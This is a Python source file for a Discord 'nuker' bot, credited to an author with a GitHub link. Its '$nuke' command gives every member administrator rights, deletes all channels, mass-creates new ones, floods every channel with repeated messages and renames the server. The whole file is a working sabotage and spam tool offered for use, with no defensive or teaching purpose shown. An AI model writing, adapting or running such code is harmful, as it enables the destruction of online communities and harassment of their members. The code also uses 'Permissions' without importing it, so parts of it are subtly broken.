import discord
import time
from colorama import Fore
from discord.ext import commands

intents = discord.Intents.all()
client = commands.Bot(command_prefix='$', intents=intents)

@client.event
async def on_ready():
    print(f'''{Fore.MAGENTA}
███████╗███████╗░█████╗░████████╗██╗░░██╗███████╗██████╗░██╗███╗░░██╗███████╗
██╔════╝██╔════╝██╔══██╗╚══██╔══╝██║░░██║██╔════╝██╔══██╗██║████╗░██║██╔════╝
█████╗░░█████╗░░███████║░░░██║░░░███████║█████╗░░██████╔╝██║██╔██╗██║█████╗░░
██╔══╝░░██╔══╝░░██╔══██║░░░██║░░░██╔══██║██╔══╝░░██╔══██╗██║██║╚████║██╔══╝░░
██║░░░░░███████╗██║░░██║░░░██║░░░██║░░██║███████╗██║░░██║██║██║░╚███║███████╗
╚═╝░░░░░╚══════╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═╝╚═╝░░╚══╝╚══════╝
    ''')
    time.sleep(1)
    print(f'''{Fore.MAGENTA} 
    Made By Featherine#3810
    Github : https://github.com/Featherineee
    Prefix : $ , $nuke
    ''')
    await client.change_presence(
    status=discord.Status.do_not_disturb,
    activity=discord.Game(name='https://github.com/Featherineee'))

@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    op1 = input('Imma Give Everyone Admin (y/n) : ')
    op2 = input('Imma Delete Every Channel On Server Avaliable (y/n) : ')
    op3 = int(input('How Many Channels You Want Me To Create : '))
    op4 = input('Name Of Channels : ')
    op5 = input('What Message Do You Want Me To Send : ')
    op6 = int(input('How Many Messages Do You Want Me To Send : '))
    op7 = input('New Server Name : ')
    if op1=='y': #Giving Everyone Admin
        try:
            role = discord.utils.get(guild.roles, name="@everyone")
            await role.edit(permissions=Permissions.all())
            print(f'{Fore.GREEN}[+]{Fore.RESET} I Have Given Everyone Admin\n')
        except:
            print(f'{Fore.RED}[-]{Fore.RESET} Unable To Give Everyone Admin! I Dont Have Admin..\n')
    elif op1=='n':
        print(f'{Fore.GREEN}Okay...')
    else:
        print(f'{Fore.RED}ERROR')
    if op2=='y': #Deleting Every Channel
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f"{Fore.GREEN}[+]{Fore.RESET} {channel.name} Was Deleted.\n")
            except:
                print(f"{Fore.RED}[-]{Fore.RESET} {channel.name} Was Not Deleted.\n")
    elif op2=='n':
        print(f'Okay...')
    for i in range(op3): #Creating New Channels
        try:
            await guild.create_text_channel(op4)
            print(f'{Fore.GREEN}[+]{Fore.RESET} Succesfully Done Delating!')
        except:
            print(f'{Fore.RED}[-]{Fore.RESET} Error Occured!\n')
    for n in range(op6): #Sending Messages
        for channel in guild.channels:
            try:
                await channel.send(op5)
                print(f'\n{Fore.GREEN}[+]{Fore.RESET} Succesfully Sent Message To {channel}\n')
            except:
                print(f'{Fore.RED}[-]{Fore.RESET} Error Occured!\n')
    try:
        await guild.edit(name=op7) #Renaming Server
        print(f'{Fore.GREEN}[+]{Fore.RESET} Name Changed To {op7}')
    except:
        print(f'{Fore.RED}[-]{Fore.RESET} Error Occured!')

client.run('') #Input Your Own Token Here
